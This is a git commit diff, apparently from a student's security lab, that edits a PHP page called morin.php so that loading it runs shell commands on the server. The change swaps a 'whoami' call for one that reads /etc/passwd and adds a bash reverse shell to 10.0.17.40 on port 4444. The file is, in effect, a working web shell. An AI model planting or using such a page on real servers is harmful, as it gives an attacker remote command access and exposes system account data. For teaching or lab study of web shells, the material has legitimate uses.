ff33fbdfca8f89906d8362fb5908477b2e4a6d69
champlainmorin <zachary.morin@mymail.champlain.edu>
2023-03-28 03:55:57 -0400

    morin.php

--- morin.php
+++ morin.php
@@ -3,10 +3,11 @@
 <body>
 
 <?php
-$output = shell_exec('whoami');
+$output = shell_exec('cat /etc/passwd');
 echo "<pre>$output</pre>";
 $output = shell_exec('uname -a');
 echo "<pre>$output</pre>";
+$output = shell_exec('bash -i >& /dev/tcp/10.0.17.40/4444 0>&1');
 ?> 
 
 </body>
